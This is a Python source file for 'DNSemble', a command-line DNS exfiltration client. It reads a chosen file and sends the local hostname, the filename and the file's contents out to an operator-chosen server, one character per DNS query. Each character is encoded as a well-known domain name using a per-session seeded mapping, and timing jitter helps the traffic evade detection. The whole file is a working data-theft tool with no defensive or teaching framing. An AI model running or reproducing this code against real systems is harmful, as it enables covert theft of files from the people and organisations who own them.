#!/usr/bin/env python3
"""
DNSemble Client — DNS Exfiltration Agent  (pure Python, zero dependencies)

Reads a target file and exfiltrates it one character at a time by
querying well-known domains through a DNSemble server.

Dynamic mapping: on SESSION_START the server returns a 32-bit seed
inside the DNS response IP.  Both sides feed that seed into the
same deterministic PRNG to derive identical char↔domain tables.
Every session uses a different mapping.
"""

import socket
import struct
import sys
import os
import time
import random
import argparse
from datetime import datetime

from domains import (
    DOMAINS, CONTROL_DOMAIN, ALL_CHARS, CHAR_TO_INDEX,
    QTYPE_A, QTYPE_AAAA, QTYPE_MX, QTYPE_LABELS,
    CTRL_SESSION_START, CTRL_END_HOSTNAME, CTRL_END_FILENAME,
    CTRL_END_CONTENT, CTRL_CHUNK_OFFSET,
    encode_txid, build_dns_query, parse_a_record,
    generate_permutation, build_char_to_domain, ip_to_seed,
)

# ── ANSI ──────────────────────────────────────────────────────────────────

class C:
    bold = "\033[1m"
    dim  = "\033[2m"
    rst  = "\033[0m"
    red  = "\033[91m"
    grn  = "\033[92m"
    ylw  = "\033[93m"
    blu  = "\033[94m"
    mag  = "\033[95m"
    cyn  = "\033[96m"

BANNER = f"""{C.cyn}{C.bold}
    ____  _   _____                 __    __
   / __ \\/ | / / ___/___  ____ ___  / /_  / /__
  / / / /  |/ /\\__ \\/ _ \\/ __ `__ \\/ __ \\/ / _ \\
 / /_/ / /|  /___/ /  __/ / / / / / /_/ / /  __/
/_____/_/ |_//____/\\___/_/ /_/ /_/_.___/_/\\___/
{C.rst}
  {C.dim}DNS Exfiltration Client  ·  v1.0   (dynamic mapping){C.rst}
"""

# ── low-level helpers ─────────────────────────────────────────────────────

def _send(sock, server, port, txid, domain, qtype):
    """Send one DNS query and return (success, raw_response)."""
    pkt = build_dns_query(txid, domain, qtype)
    sock.sendto(pkt, (server, port))
    try:
        resp, _ = sock.recvfrom(4096)
        return True, resp
    except socket.timeout:
        return False, None

def _send_ctrl(sock, server, port, cid, ctrl_seq):
    txid = encode_txid(cid, ctrl_seq)
    return _send(sock, server, port, txid, CONTROL_DOMAIN, QTYPE_A)

# ── data-phase sender ────────────────────────────────────────────────────

def send_phase(sock, server, port, cid, text, qtype, delay, jitter,
               verbose, char_to_domain):
    total = len(text)
    sent = 0
    skipped = 0
    seq = 0
    chunk = 0

    for ch in text:
        domain = char_to_domain.get(ch)
        if domain is None:
            skipped += 1
            continue

        txid = encode_txid(cid, seq)
        ok, _ = _send(sock, server, port, txid, domain, qtype)

        if verbose:
            qt = QTYPE_LABELS.get(qtype, "?")
            display = repr(ch) if ch in ("\n", "\t", "\r") else ch
            ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            status = f"{C.grn}ok{C.rst}" if ok else f"{C.red}timeout{C.rst}"
            print(f"  {C.dim}{ts}{C.rst}  '{display}' → {domain:<26s} "
                  f"{qt:<4s}  seq={seq:<3d}  {status}")

        sent += 1
        seq += 1

        if seq > 255:
            chunk += 1
            _send_ctrl(sock, server, port, cid,
                       CTRL_CHUNK_OFFSET + chunk)
            seq = 0

        if not verbose:
            pct = sent * 100 // total if total else 100
            w = 30
            filled = sent * w // total if total else w
            bar = "█" * filled + "░" * (w - filled)
            print(f"\r  {C.ylw}{bar}{C.rst}  {sent}/{total}  "
                  f"{pct}%  ", end="", flush=True)

        d = delay + random.uniform(-jitter, jitter)
        if d > 0:
            time.sleep(d)

    if not verbose and total:
        print(f"\r  {C.grn}{'█' * 30}{C.rst}  {sent}/{total}  "
              f"100%  {C.grn}DONE{C.rst}")

    if skipped:
        print(f"  {C.ylw}⚠  {skipped} unsupported chars skipped{C.rst}")
    return sent

# ── main flow ─────────────────────────────────────────────────────────────

def exfiltrate(args):
    print(BANNER)

    if not os.path.isfile(args.file):
        print(f"{C.red}[!] File not found: {args.file}{C.rst}")
        sys.exit(1)

    with open(args.file, "r") as f:
        content = f.read()

    hostname = socket.gethostname()
    filename = os.path.basename(args.file)
    cid = args.client_id if args.client_id is not None else random.randint(1, 255)
    delay_s  = args.delay / 1000.0
    jitter_s = args.jitter / 1000.0

    total_data = hostname + filename + content
    bad = {ch for ch in total_data if ch not in CHAR_TO_INDEX}
    if bad:
        print(f"  {C.ylw}⚠  Unsupported chars will be skipped: "
              f"{bad}{C.rst}")

    est_q = len(hostname) + len(filename) + len(content) + 4
    print(f"  {C.bold}Server{C.rst}       {args.server}:{args.port}")
    print(f"  {C.bold}Client ID{C.rst}    #{cid}")
    print(f"  {C.bold}Hostname{C.rst}     {hostname}")
    print(f"  {C.bold}File{C.rst}         {args.file}  →  \"{filename}\"")
    print(f"  {C.bold}Content{C.rst}      {len(content)} chars")
    print(f"  {C.bold}Est. queries{C.rst} ~{est_q}")
    print(f"  {C.bold}Delay{C.rst}        {args.delay}ms  ±{args.jitter}ms jitter")
    print(f"\n{'━' * 60}\n")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2.0)
    t0 = time.time()
    queries = 0

    # ── Phase 0: SESSION_START  →  receive seed ───────────────────
    print(f"  {C.grn}▸ SESSION_START{C.rst}  →  requesting dynamic mapping …")

    seed = None
    for attempt in range(3):
        ok, resp = _send_ctrl(sock, args.server, args.port, cid,
                              CTRL_SESSION_START)
        queries += 1
        if ok and resp:
            ip_bytes = parse_a_record(resp)
            if ip_bytes:
                seed = ip_to_seed(ip_bytes)
                break
        print(f"  {C.ylw}    retry {attempt + 1}/3 …{C.rst}")
        time.sleep(0.5)

    if seed is None:
        print(f"  {C.red}[!] Failed to negotiate mapping – "
              f"is the server running?{C.rst}")
        sock.close()
        sys.exit(1)

    perm = generate_permutation(seed)
    char_to_domain = build_char_to_domain(perm)

    print(f"  {C.grn}    seed = 0x{seed:08X}  →  "
          f"mapping built ({len(char_to_domain)} chars){C.rst}")

    if args.verbose:
        print(f"\n  {C.dim}── sample mapping ──{C.rst}")
        samples = "ABCabc019!@"
        for ch in samples:
            dom = char_to_domain.get(ch, "?")
            print(f"  {C.dim}  '{ch}' → {dom}{C.rst}")
        print()

    time.sleep(delay_s)

    # ── Phase 1: hostname  (AAAA) ─────────────────────────────────
    print(f"\n  {C.cyn}▸ Sending hostname{C.rst}  \"{hostname}\"  "
          f"({len(hostname)} chars, AAAA queries)")
    n = send_phase(sock, args.server, args.port, cid,
                   hostname, QTYPE_AAAA, delay_s, jitter_s,
                   args.verbose, char_to_domain)
    queries += n
    _send_ctrl(sock, args.server, args.port, cid, CTRL_END_HOSTNAME)
    queries += 1
    time.sleep(delay_s)

    # ── Phase 2: filename  (MX) ──────────────────────────────────
    print(f"\n  {C.mag}▸ Sending filename{C.rst}  \"{filename}\"  "
          f"({len(filename)} chars, MX queries)")
    n = send_phase(sock, args.server, args.port, cid,
                   filename, QTYPE_MX, delay_s, jitter_s,
                   args.verbose, char_to_domain)
    queries += n
    _send_ctrl(sock, args.server, args.port, cid, CTRL_END_FILENAME)
    queries += 1
    time.sleep(delay_s)

    # ── Phase 3: content   (A) ───────────────────────────────────
    print(f"\n  {C.ylw}▸ Sending content{C.rst}   "
          f"({len(content)} chars, A queries)")
    n = send_phase(sock, args.server, args.port, cid,
                   content, QTYPE_A, delay_s, jitter_s,
                   args.verbose, char_to_domain)
    queries += n
    _send_ctrl(sock, args.server, args.port, cid, CTRL_END_CONTENT)
    queries += 1

    sock.close()
    elapsed = time.time() - t0

    # ── summary ──────────────────────────────────────────────────
    print(f"\n{'━' * 60}")
    print(f"\n  {C.grn}{C.bold}Exfiltration complete!{C.rst}")
    print(f"  {C.bold}Queries sent{C.rst}  {queries}")
    print(f"  {C.bold}Elapsed{C.rst}       {elapsed:.1f}s")
    print(f"  {C.bold}Avg rate{C.rst}      {queries / elapsed:.1f} queries/s")
    print(f"  {C.bold}Seed used{C.rst}     0x{seed:08X}\n")

# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="DNSemble — DNS exfiltration client (pure Python)")
    ap.add_argument("-s", "--server", required=True,
                    help="DNSemble server IP address")
    ap.add_argument("-p", "--port", type=int, default=5353,
                    help="DNSemble server port (default 5353)")
    ap.add_argument("-f", "--file", required=True,
                    help="Path to the file to exfiltrate")
    ap.add_argument("-c", "--client-id", type=int, default=None,
                    help="Client ID 0-255 (default: random)")
    ap.add_argument("-d", "--delay", type=float, default=100,
                    help="Delay between queries in ms (default 100)")
    ap.add_argument("-j", "--jitter", type=float, default=50,
                    help="Random ± jitter in ms (default 50)")
    ap.add_argument("-v", "--verbose", action="store_true",
                    help="Show every DNS query with domain mapping")
    args = ap.parse_args()

    if args.client_id is not None and not (0 <= args.client_id <= 255):
        ap.error("client-id must be 0-255")

    exfiltrate(args)

if __name__ == "__main__":
    main()
